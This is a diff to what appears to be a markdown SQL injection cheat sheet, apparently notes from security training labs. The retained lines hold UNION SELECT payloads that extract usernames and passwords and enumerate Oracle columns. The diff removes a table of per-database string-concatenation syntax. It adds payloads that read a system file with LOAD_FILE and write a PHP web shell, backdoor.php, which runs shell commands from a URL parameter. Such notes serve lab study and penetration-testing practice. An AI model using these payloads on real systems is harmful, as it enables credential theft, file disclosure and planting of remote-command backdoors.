@@ -200,12 +200,6 @@ Concat
 
 `GET /filter?category=Pets'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--+ HTTP/1.1`
 
-|Title    | concat method |  
-| --------- | ------------- |
-|Oracle | `'foo' \|\| 'bar'` |  
-|Microsoft | `'foo'+'bar'` |  
-|PostgreSQL | `'foo' \|\| 'bar'` |
-|MySQL | `foo' 'bar'` or `CONCAT('foo','bar')` |  
 
 ### Enumeration
 MySQL
@@ -249,6 +243,13 @@ Oracle
 `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_LWSCID'+--+`
 
 `'+UNION+SELECT+USERNAME_MYUNOL,+PASSWORD_GETKJX+FROM+USERS_LWSCID+--+`
+
+### Code Injection
+
+`UNION+ALL+SELECT+NULL,+NULL,LOAD_FILE('C:/WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS')+--+`
+
+`union all select 1,2,3,4,"<?php echo
+shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
 
 ## Blind  
 ### Conditional Responses
